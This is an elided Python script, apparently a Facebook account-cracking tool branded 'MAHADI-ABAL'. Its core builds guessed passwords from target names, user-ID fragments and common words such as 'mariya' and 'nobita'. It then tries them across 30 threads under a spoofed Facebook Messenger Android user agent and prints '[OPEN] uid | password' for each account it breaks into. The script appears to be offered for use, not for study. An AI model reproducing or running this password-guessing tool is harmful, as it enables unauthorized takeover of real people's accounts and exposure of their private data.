...
try:
    ...
    print('\n \033[1;91m[\033[1;93mMAHADI-ABAL\033[1;91m]\033[1;97m installing requests !...\n')
    time.sleep(0.5)
...
try:
    ...
    print('\n \033[1;91m[\033[1;93mMAHADI-ABAL\033[1;91m]\033[1;97m installing futures !...\n')
    time.sleep(0.5)
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n \033[1;91m[\033[1;93mMAHADI-ABAL\033[1;91m]\033[1;97m installing bs4 !...\n')
    time.sleep(0.5)
...
def print_multicolor_text(text, colors):
  if len(text) != len(colors):
    raise ValueError("Text and colors must have the same length")
...
# Example usage:
text = "             𝗣𝗟𝗘𝗔𝗦𝗘 »» 𝗪𝗔𝗜𝗧𝗙𝗢𝗥 »» 𝗜𝗡𝗦𝗧𝗔𝗟𝗟"
colors = [(255, 0, 0), (255, 165, 0), (255, 255, 0),  # Red, Orange, Yellow
 (0, 255, 0), (0, 128, 0), (0, 0, 255), (148, 0, 211)]               # Indigo, Violet

# Repeat colors to match the text length
repeated_colors = colors * (len(text) // len(colors) + 1)
repeated_colors = repeated_colors[:len(text)]

print_multicolor_text(text, repeated_colors) 
...
def ___uids___():
    ...
    linex()
#    os.system('xdg-open https://github.com/Abdullha_404')
...
#    os.system('xdg-open https://www.facebook.com/M4HADI.143')
    ...
    with tred(max_workers=30) as SefatMahadi:
        ...
        for love in user:
           ...
           cu = love[:7]
           fu = ids[:8]
           passlist = [love,ids,bu,cu,fu,'১২৩৪৫৬৭৮','mariya','fariya','salman','shakil','@@@###','nobita','shizuka','mehedi','alamin','pranto']
...
def ___random___(ids,passlist):
    try:
        ...
        for pas in passlist:
            ...
            application_version_code = str(random.randint(100000000,499999999))
            ...
            XYLON = '[FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
            ...
            if 'session_key' in q:
                ...
                print(f'\r\r\x1b[38;5;208m[OPEN] '+uid+' | '+pas+'\033[1;97m')
